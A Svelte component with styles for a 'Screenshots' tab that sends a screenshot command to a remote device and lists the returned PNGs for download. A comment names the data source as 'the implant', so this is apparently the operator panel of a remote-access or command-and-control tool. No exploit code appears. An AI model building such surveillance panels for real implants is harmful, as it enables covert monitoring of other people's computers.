<script lang="ts">
	import type { createDeviceSocket } from '$lib/stores/deviceSocket';

	export let socket: ReturnType<typeof createDeviceSocket>;

	let taking = false;
	let screenshots: { name: string; time: string; dataUrl?: string }[] = [];

	async function takeScreenshot() {
		taking = true;
		const result = await socket.sendCmd('screenshot');

		if (result.ok) {
			const now = new Date();
			const pad = (n: number) => String(n).padStart(2, '0');
			const fileName = `screenshot_${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}.png`;
			screenshots = [
				{
					name: fileName,
					time: now.toLocaleString(),
					// result.data is expected to be a base64 PNG from the implant
					dataUrl: result.data ? `data:image/png;base64,${result.data}` : undefined
				},
				...screenshots
			];
		}
		taking = false;
	}

	function download(ss: { name: string; dataUrl?: string }) {
		if (!ss.dataUrl) return;
		const a = document.createElement('a');
		a.href = ss.dataUrl;
		a.download = ss.name;
		a.click();
	}
</script>

<div class="tab-panel">
	<div class="panel-header">
		<div class="header-left">
			<div class="panel-title-group">
				<svg width="14" height="14" viewBox="0 0 16 16" fill="none">
					<rect
						x="1"
						y="3"
						width="14"
						height="10"
						rx="2"
						stroke="currentColor"
						stroke-width="1.2"
					/>
					<circle cx="8" cy="8" r="2.5" stroke="currentColor" stroke-width="1.2" />
					<path
						d="M6 3l.5-1.5h3L10 3"
						stroke="currentColor"
						stroke-width="1.2"
						stroke-linecap="round"
						stroke-linejoin="round"
					/>
				</svg>
				<span class="panel-title">Screenshots</span>
			</div>
			<p class="panel-desc">Capture and manage screenshots from the device</p>
		</div>
		<button class="screenshot-btn" on:click={takeScreenshot} disabled={taking}>
			<svg width="13" height="13" viewBox="0 0 16 16" fill="none">
				<rect x="1" y="3" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.3" />
				<circle cx="8" cy="8" r="2.5" stroke="currentColor" stroke-width="1.3" />
				<path
					d="M6 3l.5-1.5h3L10 3"
					stroke="currentColor"
					stroke-width="1.3"
					stroke-linecap="round"
				/>
			</svg>
			{taking ? 'Capturing...' : 'Take Screenshot'}
		</button>
	</div>

	<div class="screenshot-list">
		{#if screenshots.length === 0}
			<p class="empty">No screenshots captured yet.</p>
		{:else}
			{#each screenshots as ss}
				<div class="screenshot-row">
					<div class="ss-info">
						<span class="ss-name">{ss.name}</span>
						<span class="ss-time">{ss.time}</span>
					</div>
					<button class="dl-btn" on:click={() => download(ss)} disabled={!ss.dataUrl}>
						<svg width="13" height="13" viewBox="0 0 16 16" fill="none">
							<path
								d="M8 1v9M5 7l3 3 3-3M2 13h12"
								stroke="currentColor"
								stroke-width="1.3"
								stroke-linecap="round"
							/>
						</svg>
						Download
					</button>
				</div>
			{/each}
		{/if}
	</div>
</div>

<style lang="scss">
	@use '$lib/styles/variables' as *;

	.tab-panel {
		display: flex;
		flex-direction: column;
	}

	.panel-header {
		padding: 16px 20px 12px;
		border-bottom: 1px solid $border;
		display: flex;
		align-items: center;
		justify-content: space-between;
		gap: 12px;
	}

	.header-left {
		display: flex;
		flex-direction: column;
		gap: 4px;
	}

	.panel-title-group {
		display: flex;
		align-items: center;
		gap: 8px;
		color: $text-muted;
	}

	.panel-title {
		font-size: 13px;
		font-weight: 600;
		color: $text-primary;
		text-transform: uppercase;
		letter-spacing: 0.5px;
	}

	.panel-desc {
		font-size: 12px;
		color: $text-muted;
		margin: 0;
	}

	.screenshot-btn {
		display: inline-flex;
		align-items: center;
		gap: 7px;
		padding: 8px 16px;
		background: #2563eb;
		color: white;
		border: none;
		border-radius: 8px;
		font-size: 12px;
		font-weight: 600;
		cursor: pointer;
		transition: all $transition;
		flex-shrink: 0;

		&:hover:not(:disabled) {
			background: #1d4ed8;
		}
		&:disabled {
			opacity: 0.4;
			cursor: not-allowed;
		}
	}

	.screenshot-list {
		padding: 16px 20px;
		display: flex;
		flex-direction: column;
		gap: 8px;
	}

	.empty {
		color: $text-muted;
		font-size: 13px;
		text-align: center;
		padding: 40px 0;
		margin: 0;
	}

	.screenshot-row {
		display: flex;
		align-items: center;
		justify-content: space-between;
		gap: 16px;
		background: rgba(255, 255, 255, 0.03);
		border: 1px solid $border;
		border-radius: 8px;
		padding: 12px 16px;
		transition: background $transition;

		&:hover {
			background: rgba(255, 255, 255, 0.05);
		}
	}

	.ss-info {
		display: flex;
		flex-direction: column;
		gap: 3px;
		overflow: hidden;
	}

	.ss-name {
		font-size: 13px;
		color: $text-primary;
		font-family: 'JetBrains Mono', monospace;
		white-space: nowrap;
		overflow: hidden;
		text-overflow: ellipsis;
	}

	.ss-time {
		font-size: 11px;
		color: $text-muted;
	}

	.dl-btn {
		display: inline-flex;
		align-items: center;
		gap: 6px;
		padding: 7px 14px;
		background: #16a34a;
		color: white;
		border: none;
		border-radius: 7px;
		font-size: 12px;
		font-weight: 600;
		cursor: pointer;
		flex-shrink: 0;
		transition: all $transition;
		&:hover:not(:disabled) {
			background: #15803d;
		}
		&:disabled {
			opacity: 0.4;
			cursor: not-allowed;
		}
	}
</style>
